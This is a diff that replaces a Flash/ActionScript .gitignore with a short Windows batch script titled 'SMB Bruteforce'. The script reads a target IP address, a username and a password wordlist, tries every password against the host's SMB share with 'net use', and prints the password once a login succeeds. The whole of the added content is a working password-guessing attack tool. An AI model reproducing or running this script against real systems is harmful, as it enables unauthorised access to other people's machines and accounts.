@@ -1,18 +1,29 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+@echo off
+title SMB Bruteforce - Jo Mama 
+color A
+echo.
+set /p ip="Enter IP Address: "
+set /p user="Enter Username: "
+set /p wordlist="Enter Password List: "
 
-# Other files and folders
-.settings/
+set /a count=1
+for /f %%a in (%wordlist%) do (
+  set pass=%%a
+  call :attempt
+)
+echo Password not Found :(
+pause
+exit
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+:success
+echo.
+echo Password Found! %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT %count%] [%pass%]
+set /a count=%count%+1
+if %errorlevel% EQU 0 goto success
